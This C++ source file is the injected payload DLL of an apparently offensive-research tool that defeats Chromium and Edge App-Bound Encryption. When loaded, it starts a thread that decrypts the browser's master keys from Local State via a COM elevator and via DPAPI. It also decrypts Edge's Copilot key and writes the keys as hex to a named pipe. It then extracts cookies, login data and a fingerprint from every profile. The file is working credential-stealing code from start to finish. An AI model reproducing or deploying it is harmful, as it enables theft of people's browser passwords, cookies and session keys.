// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "../core/common.hpp"
#include "../sys/bootstrap.hpp"
#include "../sys/internal_api.hpp"
#include "pipe_client.hpp"
#include "browser_config.hpp"
#include "data_extractor.hpp"
#include "fingerprint.hpp"
#include "../com/elevator.hpp"
#include <fstream>
#include <sstream>
#include <wincrypt.h>

using namespace Payload;

struct ThreadParams {
    HMODULE hModule;
    LPVOID lpPipeName;
};

// REMOVED DUPLICATE KeyBundle definition - using the one from data_extractor.hpp

// Returns empty vector on failure, sets errorMsg if provided
std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localState, const std::string& keyName, std::string* errorMsg = nullptr) {
    std::ifstream f(localState, std::ios::binary);
    if (!f) {
        if (errorMsg) *errorMsg = "Cannot open Local State";
        return {};
    }

    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());

    std::string tag = "\"" + keyName + "\":\"";
    size_t pos = content.find(tag);
    if (pos == std::string::npos) {
        if (errorMsg) *errorMsg = "Key not found: " + keyName;
        return {};
    }

    pos += tag.length();
    size_t end = content.find('"', pos);
    if (end == std::string::npos) {
        if (errorMsg) *errorMsg = "Malformed JSON";
        return {};
    }

    std::string b64 = content.substr(pos, end - pos);

    DWORD size = 0;
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
    if (size == 0) {
        if (errorMsg) *errorMsg = "Invalid base64 key data";
        return {};
    }

    std::vector<uint8_t> data(size);
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr);

    // For app_bound keys, skip first 4 bytes (APPB prefix)
    // For DPAPI keys, keep as-is (will handle DPAPI prefix later)
    if (keyName == "app_bound_encrypted_key" || keyName == "aster_app_bound_encrypted_key") {
        if (data.size() >= 4) {
            return std::vector<uint8_t>(data.begin() + 4, data.end());
        }
    }
    
    return data;
}

// DPAPI decryption helper
std::optional<std::vector<uint8_t>> DecryptWithDPAPI(const std::vector<uint8_t>& encrypted) {
    if (encrypted.empty()) {
        return std::nullopt;
    }

    // Check for "DPAPI" ASCII prefix
    const std::string dpapi_prefix = "DPAPI";
    std::vector<uint8_t> encrypted_data = encrypted;
    
    if (encrypted_data.size() > dpapi_prefix.size() &&
        memcmp(encrypted_data.data(), dpapi_prefix.c_str(), dpapi_prefix.size()) == 0) {
        // Remove DPAPI prefix
        encrypted_data.erase(encrypted_data.begin(), encrypted_data.begin() + dpapi_prefix.size());
    }

    DATA_BLOB inBlob, outBlob;
    inBlob.cbData = static_cast<DWORD>(encrypted_data.size());
    inBlob.pbData = encrypted_data.data();

    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
        std::vector<uint8_t> decrypted(outBlob.pbData, outBlob.pbData + outBlob.cbData);
        LocalFree(outBlob.pbData);
        return decrypted;
    }

    return std::nullopt;
}

std::string KeyToHex(const std::vector<uint8_t>& key) {
    std::string hex;
    for (auto b : key) {
        char buf[3];
        sprintf_s(buf, "%02X", b);
        hex += buf;
    }
    return hex;
}

DWORD WINAPI PayloadThread(LPVOID lpParam) {
    auto params = std::unique_ptr<ThreadParams>(static_cast<ThreadParams*>(lpParam));
    LPCWSTR pipeName = static_cast<LPCWSTR>(params->lpPipeName);
    HMODULE hModule = params->hModule;

    {
        PipeClient pipe(pipeName);
        if (!pipe.IsValid()) {
            FreeLibraryAndExitThread(hModule, 0);
            return 1;
        }

        try {
            auto config = pipe.ReadConfig();
            auto browser = GetConfigs().at(config.browserType);

            pipe.LogDebug("Running in " + browser.name);

            // Initialize syscalls
            if (!Sys::InitApi(config.verbose)) {
                pipe.LogDebug("Warning: Syscall initialization failed.");
            }

            // Create KeyBundle to hold both keys
            KeyBundle keys;  // This is now Payload::KeyBundle from data_extractor.hpp

            // 1. Try to get and decrypt app_bound_encrypted_key (via COM)
            std::string error;
            auto encKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "app_bound_encrypted_key", &error);

            if (!encKey.empty()) {
                try {
                    Com::Elevator elevator;
                    auto masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.iid_v2, browser.name == "Edge");
                    keys.appKey = masterKey;
                    pipe.Log("APP_KEY:" + KeyToHex(masterKey));
                } catch (const std::exception& e) {
                    pipe.LogDebug("COM decryption failed: " + std::string(e.what()));
                }
            }

            // 2. ALWAYS try to get and decrypt encrypted_key (via DPAPI)
            auto dpapiEncKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "encrypted_key");
            if (!dpapiEncKey.empty()) {
                auto osKey = DecryptWithDPAPI(dpapiEncKey);
                if (osKey) {
                    keys.osKey = *osKey;
                    pipe.Log("OS_KEY:" + KeyToHex(*osKey));
                } else {
                    pipe.LogDebug("DPAPI decryption failed for os_crypt key");
                }
            }

            // 3. Check if we have at least one valid key
            if (!keys.appKey && !keys.osKey) {
                pipe.Log("NO_KEYS:No usable encryption keys found");
                // Exit gracefully - pipe destructor will send completion signal
                FreeLibraryAndExitThread(hModule, 0);
                return 0;
            }

            // 4. Extract Copilot key for Edge (keep this feature)
            if (browser.name == "Edge" && keys.appKey) {
                auto asterEncKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "aster_app_bound_encrypted_key");
                if (!asterEncKey.empty()) {
                    try {
                        Com::Elevator elevator;
                        auto asterKey = elevator.DecryptKeyEdgeIID(asterEncKey, browser.clsid, browser.iid);
                        pipe.Log("ASTER_KEY:" + KeyToHex(asterKey));
                    } catch (...) {
                        // Aster key decryption failed - silently continue
                    }
                }
            }

            // 5. Create DataExtractor with KeyBundle
            DataExtractor extractor(pipe, keys, config.outputPath);

            // 6. Process all profiles
            for (const auto& entry : std::filesystem::directory_iterator(browser.userDataPath)) {
                try {
                    if (entry.is_directory()) {
                        if (std::filesystem::exists(entry.path() / "Network" / "Cookies") ||
                            std::filesystem::exists(entry.path() / "Login Data")) {
                            extractor.ProcessProfile(entry.path(), browser.name);
                        }
                    }
                } catch (...) {
                    // Continue to next profile if one fails
                }
            }

            // 7. Extract fingerprint if requested
            if (config.fingerprint) {
                FingerprintExtractor fingerprinter(pipe, browser, config.outputPath);
                fingerprinter.Extract();
            }

        } catch (const std::exception& e) {
            pipe.Log("[-] " + std::string(e.what()));
        }
    }

    FreeLibraryAndExitThread(hModule, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        auto params = new ThreadParams{hModule, lpReserved};
        HANDLE hThread = CreateThread(NULL, 0, PayloadThread, params, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}